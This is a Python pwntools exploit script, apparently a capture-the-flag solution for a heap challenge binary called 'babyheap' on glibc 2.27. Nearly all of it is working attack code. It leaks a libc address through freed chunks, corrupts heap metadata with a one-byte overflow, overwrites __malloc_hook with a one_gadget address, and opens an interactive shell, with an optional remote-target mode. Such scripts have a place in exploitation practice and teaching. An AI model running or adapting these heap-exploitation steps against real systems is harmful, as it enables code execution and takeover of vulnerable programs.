from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'babyheap'
elf = ELF(program,checksec=False)
lokal = True
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    libc = elf.libc #2.27
else:
    host = ''
    port = ''
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)

#Exploit Here
def malloc(size,content):
	sla("> ","M")
	sla("> ",str(size))
	sla("> ",content)

def free(idx):
	sla("> ","F")
	sla("> \n",str(idx))

def show(idx):
	sla("> ","S")
	sla("> ",str(idx))
	return xp.recvline()[:-1]

for i in xrange(10):
	malloc(0xf8,"A"*0xf8)

for i in range(9,-1,-1):
	free(i)

for i in xrange(9):
	malloc(0xf8,"")

leak = uu64(show(8))
print "Libc Leak = "+hex(leak)
libc.address = leak - 0x3ebca0
print "Libc base = "+hex(libc.address)

for i in range(8,-1,-1):
	free(i)

malloc(8,"A"*8)
malloc(8,"B"*8)

free(0)
free(1)

malloc(8,"C"*8)
malloc(0xf8,"A"*0xf8+"\x81")

free(0)

p = "\x90"*0x100
p += p64(libc.symbols['__malloc_hook'])[:6]
malloc(0x174,p)

one = libc.address + 0x10a45c

malloc(0xf8,"A")
# malloc(0xf8,"A")

malloc(0xf8,p64(one)[:6])

sla("> ","M")
sla("> ","10")

xp.interactive()
